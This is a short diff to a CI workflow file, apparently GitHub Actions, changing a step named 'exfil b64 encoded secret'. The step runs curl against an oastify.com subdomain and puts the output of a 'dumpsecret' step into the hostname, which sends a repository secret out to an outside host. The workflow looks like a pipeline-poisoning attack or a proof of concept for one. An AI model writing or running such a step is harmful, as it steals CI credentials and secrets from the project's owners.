@@ -33,4 +33,4 @@ jobs:
           
       - name: exfil b64 encoded secret
         run: |
-          curl -v http://${{steps.exfil2.outputs.eureka}}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
+          curl -v http://${{steps.dumpsecret.outputs.exfil}}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
